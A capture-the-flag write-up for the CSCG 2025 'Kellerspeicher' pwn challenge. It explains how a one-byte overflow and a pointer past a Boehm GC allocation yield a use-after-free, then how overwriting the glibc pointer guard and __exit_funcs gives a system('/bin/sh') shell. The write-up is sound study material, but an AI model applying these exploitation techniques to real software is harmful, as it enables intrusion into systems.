<!DOCTYPE html><html><head>
      <title>kellerspeicher</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      
      <link rel="stylesheet" href="katex.min.css">
      
      
      
      
      
      <style>
      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
/* Please visit the URL below for more information: */
/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */

      </style>
      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
  document.addEventListener("DOMContentLoaded", function () {
    // your code here
  });
</script></head><body for="html-export">
    
    
      <div class="crossnote markdown-preview  ">
      
<h1 id="cscg-2025---kellerspeicher">CSCG 2025 - Kellerspeicher </h1>
<h2 id="challenge-information">Challenge Information </h2>
<p>Description:</p>
<blockquote>
<p>I build some Kellerspeicher for you. To prevent memory leaks I use a garbage collector. Definitely not because I'm lazy.</p>
</blockquote>
<ul>
<li>Category: <code>Pwn</code></li>
<li>Difficulty: <code>Hard</code></li>
<li>Author: <code>DIFF-FUSION</code></li>
</ul>
<h2 id="challenge-setup">Challenge Setup </h2>
<p>All of the identifiers and strings in the challenge code are written in German. I am going to refer to those operation with their English translation most of the time.</p>
<p>The challenge implements a service to manage two stacks, a main (<code>"haupt"</code>) and a side (<code>"neben"</code>) stack, in C. They can be created, deleted, pushed and popped from and elements can be exchanged between the two. So far, so normal. There is also the option to just once increase the amount of free elements in the main stack without increasing the allocated memory. Thus, a one byte overflow is possible.</p>
<p>A stack is represented by the following struct:</p>
<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token keyword keyword-struct">struct</span> <span class="token class-name">Stack</span> <span class="token punctuation">{</span>
    <span class="token class-name">uint8_t</span> <span class="token operator">*</span>elements<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> used<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> free<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><p>Both the stack struct and the elements array in the stack, are allocated on the heap. As was already hinted at in the challenge description, <a href="https://github.com/ivmai/bdwgc">libgc</a> is used as memory allocator.</p>
<p>The challenge uses glibc 2.39 and is provided with the challenge.</p>
<h2 id="libgc---the-boehm-demers-weiser-conservative-cc-garbage-collector">libgc - The Boehm-Demers-Weiser conservative C/C++ Garbage Collector </h2>
<p><a href="https://github.com/ivmai/bdwgc">libgc</a> implements automatic Garbage Collection for C and C++ programs. This means there is no longer the need for an explicit call to <code>free</code>. The implementation scans the programs memory periodically to find all reachable chunks, i.e. there exists a pointer to it. Those are called <code>roots</code>. The GC searches in the binaries data segments (<code>.data</code>, <code>.bss</code>), the program stack, registers and some other regions. From there, found chunks are marked as accessible and scanned recursively for further pointers. In the end, all unmarked chunks are deallocated. This is also known as mark-and-sweep algorithm and used by many garbage collectors.</p>
<p>Allocation in <code>libgc</code> happens page-wise. Allocations smaller than a certain threshold (<code>512</code> bytes, on Linux x64) are allocated from a page which has been split into multiple chunks for the same size and therefore only serves this size, until all chunks are being deallocated and the page can be freed. For allocations larger than the threshold, the size is rounded up to a multiple of the page size. Allocation sizes always are incremented by 1 to enforce that the pointer to the chunk, for example an allocated array, is always pointing into the chunks memory and thus is recognized by the collector as in-use and not accidentally deallocated. For example, <code>malloc(0x40) + 0x40</code> points to the region after the allocation, which often occurs when an array pointer is incremented and the array is fully filled. (*hint* *hint*)</p>
<p>There is also an optimization for allocations in multithreaded from a thread-local cache, similar to <code>ptmalloc</code>'s tcaches, which is not relevant to the solution of challenge, but may affect the allocation pattern, depending on the chosen chunk sizes.</p>
<h2 id="exploit---overview">Exploit - Overview </h2>
<p>By allocating a main stack of size <code>0x1000</code>, doing the overflow operation and filling the main stack fully up, the elements pointer will point to the end of the allocated array, as described before.<br>
This means that when the garbage collector finds the pointer, it counts the pointer as pointing to the next chunk after the array because that is where the pointer points. Therefore, we allocate new side stacks until the garbage collector is triggered, which gives us a use-after-free. The exact number of allocations can be determined experimentally. I found the value to be <code>1834</code> for the allocation sizes that I chose.</p>
<p>To achieve arbitrary read and write, we need to manage to allocate the side chunk stack into that the memory region where the main stack <code>elements</code> pointer points to. From there, we can leak the side stack <code>elements</code> pointer by popping bytes from and overwrite it by pushing bytes to the main stack. To write to the chosen memory location, we can push to the side stack.</p>
<p>To achieve RCE, we first overwrite the pointer guard in the thread-local storage (TLS) with zero, which is at a constant offset from the mmapped GC heap region. Then we overwrite the first exit function with with <code>fn=system</code> and <code>arg="/bin/sh"</code>. Because we know the pointer guard, we can mangle the function pointer and successfully get a shell by quitting the program.</p>
<p>If you know, how gaining RCE via exit functions work you can skip the following paragraph.</p>
<h2 id="rce-via-__exit_funcs---details">RCE via __exit_funcs - details </h2>
<p>Before the program exits, oftentimes some code has to run in order to perform some cleanup. Those can be registered by using the <a href="https://man7.org/linux/man-pages/man3/atexit.3.html"><code>atexit</code></a> function in <code>C</code>. Those are stored in <code>struct exit_function_list</code> inside the glibc. The relevant definitions from <a href="https://elixir.bootlin.com/glibc/glibc-2.39.9000/source/stdlib/exit.h#L25"><code>exit.h</code></a> can be found below.</p>
<pre data-role="codeBlock" data-info="C" class="language-c C"><code><span class="token keyword keyword-enum">enum</span>
<span class="token punctuation">{</span>
  ef_free<span class="token punctuation">,</span>	<span class="token comment">/* `ef_free' MUST be zero!  */</span>
  ef_us<span class="token punctuation">,</span>
  ef_on<span class="token punctuation">,</span>
  ef_at<span class="token punctuation">,</span>
  ef_cxa
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword keyword-struct">struct</span> <span class="token class-name">exit_function</span>
  <span class="token punctuation">{</span>
    <span class="token comment">/* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */</span>
    <span class="token keyword keyword-long">long</span> <span class="token keyword keyword-int">int</span> flavor<span class="token punctuation">;</span>
    <span class="token keyword keyword-union">union</span>
      <span class="token punctuation">{</span>
	<span class="token keyword keyword-void">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>at<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword keyword-struct">struct</span>
	  <span class="token punctuation">{</span>
	    <span class="token keyword keyword-void">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>fn<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> status<span class="token punctuation">,</span> <span class="token keyword keyword-void">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token keyword keyword-void">void</span> <span class="token operator">*</span>arg<span class="token punctuation">;</span>
	  <span class="token punctuation">}</span> on<span class="token punctuation">;</span>
	<span class="token keyword keyword-struct">struct</span>
	  <span class="token punctuation">{</span>
	    <span class="token keyword keyword-void">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>fn<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token operator">*</span>arg<span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span> status<span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token keyword keyword-void">void</span> <span class="token operator">*</span>arg<span class="token punctuation">;</span>
	    <span class="token keyword keyword-void">void</span> <span class="token operator">*</span>dso_handle<span class="token punctuation">;</span>
	  <span class="token punctuation">}</span> cxa<span class="token punctuation">;</span>
      <span class="token punctuation">}</span> func<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword keyword-struct">struct</span> <span class="token class-name">exit_function_list</span>
  <span class="token punctuation">{</span>
    <span class="token keyword keyword-struct">struct</span> <span class="token class-name">exit_function_list</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> idx<span class="token punctuation">;</span>
    <span class="token keyword keyword-struct">struct</span> <span class="token class-name">exit_function</span> fns<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><p>The <code>exit_function_list</code>, is a linked list, where every node can store up to 32 <code>exit_function</code>s. Different types specify the number of parameters and their types which are passed to the handler function. For exploitation, the <code>ef_cxa</code> type is the most interesting, because it allows to specify an argument which is passed as the first parameter. With that we can easily execute <code>system("/bin/sh")</code>.</p>
<p>The <code>__exit_funcs</code> variable in the glibc stores the pointer to the head of the list. As the symbol is not exported by the glibc, it can be difficult to find its address. In case you have the debug symbols, you are in luck. If not, you can try to use <a href="https://libc.rip/">libc.rip</a> or by diffing the source code and the assembly of <code>atexit</code> (the symbol is mangled to <code>__cxa_atexit</code>) and extracting the address from there. For this challenge, I took the latter approach. <code>atexit</code> is used to register new exit functions and thus needs to reference <code>__exit_funcs</code>.</p>
<p>The source code of <code>__cxa_atexit</code> can be found <a href="https://elixir.bootlin.com/glibc/glibc-2.39.9000/source/stdlib/cxa_atexit.c#L65">here</a>, for example. Below I put the important snippet.</p>
<pre data-role="codeBlock" data-info="C" class="language-c C"><code><span class="token keyword keyword-int">int</span>
attribute_hidden
<span class="token function">__internal_atexit</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword keyword-void">void</span> <span class="token operator">*</span>arg<span class="token punctuation">,</span> <span class="token keyword keyword-void">void</span> <span class="token operator">*</span>d<span class="token punctuation">,</span>
		   <span class="token keyword keyword-struct">struct</span> <span class="token class-name">exit_function_list</span> <span class="token operator">*</span><span class="token operator">*</span>listp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword keyword-struct">struct</span> <span class="token class-name">exit_function</span> <span class="token operator">*</span>new<span class="token punctuation">;</span>

  <span class="token comment">/* As a QoI issue we detect NULL early with an assertion instead
     of a SIGSEGV at program exit when the handler is run (bug 20544).  */</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>func <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">__libc_lock_lock</span> <span class="token punctuation">(</span>__exit_funcs_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
  new <span class="token operator">=</span> <span class="token function">__new_exitfn</span> <span class="token punctuation">(</span>listp<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>new <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">__libc_lock_unlock</span> <span class="token punctuation">(</span>__exit_funcs_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword keyword-return">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

  <span class="token function">PTR_MANGLE</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
  new<span class="token operator">-&gt;</span>func<span class="token punctuation">.</span>cxa<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span> func<span class="token punctuation">;</span>
  new<span class="token operator">-&gt;</span>func<span class="token punctuation">.</span>cxa<span class="token punctuation">.</span>arg <span class="token operator">=</span> arg<span class="token punctuation">;</span>
  new<span class="token operator">-&gt;</span>func<span class="token punctuation">.</span>cxa<span class="token punctuation">.</span>dso_handle <span class="token operator">=</span> d<span class="token punctuation">;</span>
  new<span class="token operator">-&gt;</span>flavor <span class="token operator">=</span> ef_cxa<span class="token punctuation">;</span>
  <span class="token function">__libc_lock_unlock</span> <span class="token punctuation">(</span>__exit_funcs_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">/* Register a function to be called by exit or when a shared library
   is unloaded.  This function is only called from code generated by
   the C++ compiler.  */</span>
<span class="token keyword keyword-int">int</span>
<span class="token function">__cxa_atexit</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword keyword-void">void</span> <span class="token operator">*</span>arg<span class="token punctuation">,</span> <span class="token keyword keyword-void">void</span> <span class="token operator">*</span>d<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword keyword-return">return</span> <span class="token function">__internal_atexit</span> <span class="token punctuation">(</span>func<span class="token punctuation">,</span> arg<span class="token punctuation">,</span> d<span class="token punctuation">,</span> <span class="token operator">&amp;</span>__exit_funcs<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__cxa_atexit<span class="token punctuation">)</span>
</code></pre><p>By using a disassembler, we find the following instructions:</p>
<pre data-role="codeBlock" data-info="assembly" class="language-assembly assembly"><code>00000000000471e0 &lt;__cxa_atexit@@GLIBC_2.2.5&gt;:
   471e0:       f3 0f 1e fa             endbr64
   471e4:       55                      push   rbp
   471e5:       48 89 e5                mov    rbp,rsp
   471e8:       41 56                   push   r14
   471ea:       41 55                   push   r13
   471ec:       41 54                   push   r12
   471ee:       53                      push   rbx
   471ef:       48 85 ff                test   rdi,rdi
   471f2:       0f 84 8e 00 00 00       je     47286 &lt;__cxa_atexit@@GLIBC_2.2.5+0xa6&gt;
   471f8:       48 8d 1d a9 dd 1b 00    lea    rbx,[rip+0x1bdda9]        # 204fa8 &lt;__abort_msg@@GLIBC_PRIVATE+0x468&gt;
   471ff:       49 89 d4                mov    r12,rdx
   47202:       49 89 fe                mov    r14,rdi
   47205:       49 89 f5                mov    r13,rsi
   47208:       31 c0                   xor    eax,eax
   4720a:       ba 01 00 00 00          mov    edx,0x1
   4720f:       f0 0f b1 13             lock cmpxchg DWORD PTR [rbx],edx
   47213:       75 5b                   jne    47270 &lt;__cxa_atexit@@GLIBC_2.2.5+0x90&gt;
   47215:       48 8d 3d 64 c4 1b 00    lea    rdi,[rip+0x1bc464]        # 203680 &lt;__ctype_b@GLIBC_2.2.5+0x18&gt;
   4721c:       e8 cf fd ff ff          call   46ff0 &lt;__cxa_at_quick_exit@@GLIBC_2.10+0x20&gt;
   47221:       48 85 c0                test   rax,rax
   47224:       74 54                   je     4727a &lt;__cxa_atexit@@GLIBC_2.2.5+0x9a&gt;
   47226:       4c 89 68 10             mov    QWORD PTR [rax+0x10],r13
   4722a:       4c 89 f2                mov    rdx,r14
   4722d:       4c 89 60 18             mov    QWORD PTR [rax+0x18],r12
   47231:       48 c7 00 04 00 00 00    mov    QWORD PTR [rax],0x4
   47238:       64 48 33 14 25 30 00    xor    rdx,QWORD PTR fs:0x30
   4723f:       00 00 
   47241:       48 c1 c2 11             rol    rdx,0x11
   /* ... */
</code></pre><p>As we can see in the source code, the <code>__cxa_atexit</code> uses <code>__exit_funcs</code> and pass it to <code>__internal_atexit</code>. But this call does not show up in the assembly because the compiler inlined the function. The <code>__internal_atexit</code> first locks the global exit function lock, then finds a slot for the new exit function (which uses <code>__exit_funcs</code>) and then doing a null check on the result. This pattern also can be seen in the assembly: First there is the <code>lock cmpxchg</code> for the lock operation, then the call at offset <code>0x4721c</code> and the null check directly afterward. Thus, the instruction at <code>0x47215</code> gets the address of the argument to <code>__new_exitfn</code>, which is <code>__exit_funcs</code>. Thus, we found what we were looking for.</p>
<p>One further obstacle we need to overcome, is the mangling/encryption of the function pointer with the pointer guard. The formula is:</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mi>t</mi><mo>=</mo><mi>r</mi><mi>o</mi><mi>l</mi><mo stretchy="false">(</mo><mi>f</mi><mi>n</mi><mo>⊕</mo><mi>p</mi><mi>o</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">_</mi><mi>g</mi><mi>u</mi><mi>a</mi><mi>r</mi><mi>d</mi><mo separator="true">,</mo><mn>17</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ct = rol(fn \oplus pointer\_guard, 17)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ro</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal">in</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">gu</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">17</span><span class="mclose">)</span></span></span></span></span></p>
<p>where <code>ct</code> is the stored ciphertext, <code>rol</code> the rotate left function and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊕</mo></mrow><annotation encoding="application/x-tex">\oplus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord">⊕</span></span></span></span> the xor operator.</p>
<p>With all of that understood, we can overwrite one of the exit functions with, because we set the pointer guard to zero.</p>
